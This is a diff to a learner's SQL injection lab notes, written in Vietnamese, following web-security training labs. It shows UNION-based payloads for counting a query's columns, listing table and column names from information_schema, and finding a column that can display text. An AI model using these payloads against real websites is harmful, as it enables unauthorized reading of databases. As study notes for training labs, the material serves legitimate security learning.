@@ -6,13 +6,13 @@ ____________________________________________________________
 
 
 Lab: SQL injection UNION attack, determining the number of columns returned by the query ( non - Orancle )
-  target: tìm đc số cột của bảng trên web
+  target: tìm đc SỐ CỘT CỦA BẢNG trên web
     + check số cột    
       ' UNION SELECT NULL, NULL ,NULL --
 
 
 Lab: SQL injection attack, querying the database type and version ( on - Oracle)
-  target : phải đảm bảo output của payload trùng với số cột của bảng cái mà nằm trên giao diện web 
+  target : phải đảm bảo output của payload trùng với SỐ CỘT CỦA BẢNG cái mà nằm trên giao diện web 
   (CÁI NÀY BẮT BUỘC PHẢI CÓ FROM NÊN KHI CHECK CỘT PHẢI DÙNG BẢNG dual )
   payload : 
     + check số cột : 
@@ -34,6 +34,13 @@ Lab: SQL injection attack, listing the database contents on non-Oracle databases
 
     + check list tên cột trong 1 bảng :
       ' union SELECT column_name , null FROM information_schema.columns WHERE table_name='' --
+
+
+Lab: SQL injection UNION attack, finding a column containing text
+  target : tìm xem kiểu dữ liệu có thể xuất ra màn hình của các cột trong bảng của web
+  payload : (vd test thay string vào từng vị trí trong payload , nếu cái nào k gây ra lỗi thì tại cái vị trí đó có thể chứa data kiểu string và làm tương tự với các kiểu data khác)
+    ' UNION SELECT NULL , 'zUgbJ9' , NULL --
+
 
 
 
